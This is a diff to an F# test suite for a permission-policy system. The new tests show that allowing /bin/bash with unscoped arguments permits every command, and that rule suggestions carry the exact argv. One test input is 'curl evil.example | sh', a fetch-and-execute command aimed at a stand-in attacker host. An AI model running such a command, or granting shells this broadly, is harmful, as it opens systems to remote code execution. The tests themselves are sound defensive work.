@@ -400,6 +400,49 @@ let processRulesPreserveArgumentOrder =
     | Error e -> failtest e
   }
 
+let aShellRuleGrantsEverything =
+  test "granting the shell as a process grants every command it can run" {
+    // `cliExecute` does not run the command it is given. It runs `$SHELL -c <command>`, so the
+    // request the policy sees names the SHELL as the executable and puts the whole command line
+    // in the arguments. A rule naming an executable and nothing else scopes its arguments to
+    // `All`, which is the right default for `allow process /usr/bin/git` and the wrong one here.
+    //
+    // The result is a rule that reads as "this program may run bash" and means "this program may
+    // run anything". Pinned as a test rather than left as a remark, because it is the kind of
+    // thing that reads fine in a policy review.
+    let shellOnly =
+      Permission.Policy.create
+        [ Permission.Rule.Process
+            { executable = only "/bin/bash"; args = Permission.Scope.All } ]
+        []
+
+    let allows executable args =
+      match Permission.Request.processSpawn executable args with
+      | Ok operation -> Permission.Policy.allows operation shellOnly
+      | Error _ -> false
+
+    Expect.isTrue (allows "/bin/bash" [ "-c"; "ls" ]) "the benign command somebody had in mind"
+    Expect.isTrue
+      (allows "/bin/bash" [ "-c"; "curl evil.example | sh" ])
+      "and every other command, which is the point"
+
+    // Naming the arguments is the only way to actually narrow it, and then it narrows to one
+    // exact command line rather than to a program.
+    let oneCommand =
+      Permission.Policy.create
+        [ Permission.Rule.Process
+            { executable = only "/bin/bash"; args = only [ "-c"; "ls" ] } ]
+        []
+
+    let allowsExactly executable args =
+      match Permission.Request.processSpawn executable args with
+      | Ok operation -> Permission.Policy.allows operation oneCommand
+      | Error _ -> false
+
+    Expect.isTrue (allowsExactly "/bin/bash" [ "-c"; "ls" ]) "the command named"
+    Expect.isFalse (allowsExactly "/bin/bash" [ "-c"; "ls -l" ]) "and nothing else, not even close"
+  }
+
 let coverableEffectsFollowTheRules =
   test "the effects a policy can allow are read off its allow rules" {
     Expect.equal
@@ -440,6 +483,17 @@ let suggestRuleIsActionable =
       (suggest (ok (Permission.Request.native "cliProcessIO")))
       None
       "the all-or-nothing native boundary has no scoped rule to suggest"
+    // The arguments, because a process rule without them scopes them to `All`. Suggesting the
+    // program alone would offer a grant wider than the request that prompted it, which is the
+    // one thing a suggestion must never do.
+    Expect.equal
+      (suggest (ok (Permission.Request.processSpawn "/usr/bin/git" [ "status" ])))
+      (Some "process '/usr/bin/git' 'status'")
+      "a spawn suggests the argv it actually asked for"
+    Expect.equal
+      (suggest (ok (Permission.Request.processSpawn "/bin/bash" [ "-c"; "ls" ])))
+      (Some "process '/bin/bash' '-c' 'ls'")
+      "and for a shell that is the difference between one command and all of them"
   }
 
 let capturedAccessCannotWidenCaller =
@@ -512,6 +566,7 @@ let tests =
       fileRulesRespectBoundaries
       fileRulesSeeThroughSymlinkedRoots
       processRulesPreserveArgumentOrder
+      aShellRuleGrantsEverything
       coverableEffectsFollowTheRules
       suggestRuleIsActionable
       capturedAccessCannotWidenCaller
